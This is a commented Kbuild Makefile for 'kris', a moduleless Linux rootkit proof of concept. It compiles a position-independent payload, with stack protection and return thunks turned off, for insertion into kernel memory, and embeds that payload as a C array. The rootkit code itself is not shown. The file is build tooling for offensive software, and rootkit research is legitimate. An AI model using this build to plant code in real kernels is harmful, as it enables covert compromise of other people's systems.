# This script is used for building kris, the moduleless rootkit PoC.

# Add kris.o to the list of objects to be built.
obj-m	+= kris.o

# This adds "main.o" to the list of object files for kris.
kris-y	+= main.o

# Set up the flags for compilation of the payload, which will be inserted into the kernel by kris.
# First, we copy the flags from the kernel build system.
PAYLOAD_CFLAGS := $(KBUILD_CPPFLAGS) $(KBUILD_CFLAGS)

# The next several lines filter out certain flags that don't apply or cause issues when compiling payload.c.
# The first two lines filter out the -pg and -mfentry flags, which are used for profiling and function tracing, respectively.
PAYLOAD_CFLAGS := $(filter-out -pg, $(PAYLOAD_CFLAGS))
PAYLOAD_CFLAGS := $(filter-out -mfentry, $(PAYLOAD_CFLAGS))

# The next two lines filter out the -mcmodel and -mindirect-branch flags, which cause issues with the function-return=keep flag.
PAYLOAD_CFLAGS := $(filter-out -mcmodel=%, $(PAYLOAD_CFLAGS))
PAYLOAD_CFLAGS := $(filter-out -mindirect-branch=%, $(PAYLOAD_CFLAGS))

# Afterwards, we include LINUX kernel header files.
PAYLOAD_CFLAGS := $(PAYLOAD_CFLAGS) $(LINUXINCLUDE)

# The -fno-stack-protector flag disables stack protection, which could cause the payload to crash.
# The -std=gnu99 flag sets the C standard, just to keep things consistent.
PAYLOAD_CFLAGS := $(PAYLOAD_CFLAGS) -std=gnu99 -fno-stack-protector

# The -mfunction-return=keep flag is used to stop the compiler from messing with the payload's return address.
# The -fpie flag is used to make sure that the payload is compiled as a position-independent executable.
# We need this because the payload will be inserted into kernel memory.
PAYLOAD_CFLAGS := $(PAYLOAD_CFLAGS) -mfunction-return=keep -fpie 

# Next, we add the -nostdlib, -nostartfiles, and -nodefaultlibs flags to make sure that the payload is not linked against any libraries.
PAYLOAD_CFLAGS := $(PAYLOAD_CFLAGS) -nostdlib -nostartfiles -nodefaultlibs

# Here we make sure that the payload is linked against our custom linker script.
PAYLOAD_CFLAGS := $(PAYLOAD_CFLAGS) -Wl,--script=$(src)/payload.lds -Wl,--no-dynamic-linker 

# Ensure that the payload is built before kris.
$(src)/main.o: payload

# Here we have rules to generate payload using gcc.
# After payload is generated, we use the dumper.sh script to convert it into a C array.
# The C array is then written to payload.inc, which is included in main.c.
payload: FORCE
	$(CC) $(PAYLOAD_CFLAGS) $(src)/payload.c -o $(src)/payload
	$(SHELL) $(src)/tools/dumper.sh $(src)/payload >$(src)/payload.inc

# The clean-files directive makes sure to remove the payload and payload.inc when the make clean command is executed.
clean-files += payload payload.inc

# FORCE target does nothing, but it makes sure that payload gets remade every time.
FORCE: